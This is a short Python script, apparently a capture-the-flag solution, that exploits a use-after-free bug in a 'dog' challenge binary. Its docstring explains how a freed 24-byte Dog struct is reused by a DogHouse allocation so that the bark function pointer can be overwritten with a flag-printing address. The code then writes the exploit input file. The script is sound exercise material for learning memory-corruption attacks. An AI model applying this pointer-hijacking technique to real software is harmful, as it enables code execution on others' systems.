class Actions:                  
    BuyADog = b'1'              
    MakeHimBark = b'2'          
    BringMeTheFlag = b'3'       
    WatchHisDeath = b'4'        
    BuildADogHouse = b'5'       
    GiveDogHouseToYourDog = b'6'
    BreakDogHouse = b'7'        
                                
                                
                                
def main():
    """
    Use after free bug relies on the implementation of malloc and free. 
    The way the work is explained Here: https://stackoverflow.com/questions/1119134/how-do-malloc-and-free-work

    Ok so now we now that free doesn't always returns the memory to the OS, and in this case
    it's definately not returned since we're talking about a very small piece of memory (about 24 bytes).
    In addition, the DogHouse and Dog structs are at the same length of 24 bytes which means when you
    free one of them, the next malloc usage is going to give you the same address.

    Now we can take advantage out of it by replacing bark() pointer with bringBackTheFlag() pointer.
    In order to do that simply do as follows:
     -) Using the readelf command  find the address of bringBackTheFlag
     -) Run the elf file
     -) Buy a dog with whatever name u want
     -) Kill the dog :(
     -) Build a dog house with address that its last 4 bytes are the bringBackTheFlag address, since we want to write to index 12 in the Dog 
        struct which is the brark function. The house name doesn't matter.
     -) Choose Bring me the flag
    """                                                                                    
    dog_name = b'Plotu'                                                                    
    house_address = b'a' * 12 + int.to_bytes(0x80487cb, 4, 'little')                       
    house_name = b'irelevant'                                                              
                                                                                           
    with open('input', 'wb') as input_file:                                                
        input_file.write(Actions.BuyADog + b'\n')                                          
        input_file.write(dog_name + b'\n')                                                 
        input_file.write(Actions.WatchHisDeath + b'\n')                                    
        input_file.write(Actions.BuildADogHouse + b'\n')                                   
        input_file.write(house_address + b'\n')                                            
        input_file.write(house_name + b'\n')                                               
        input_file.write(Actions.BringMeTheFlag + b'\n')                                   
                                                                                           
                                                                                           
if __name__ == '__main__':                                                                 
    main()
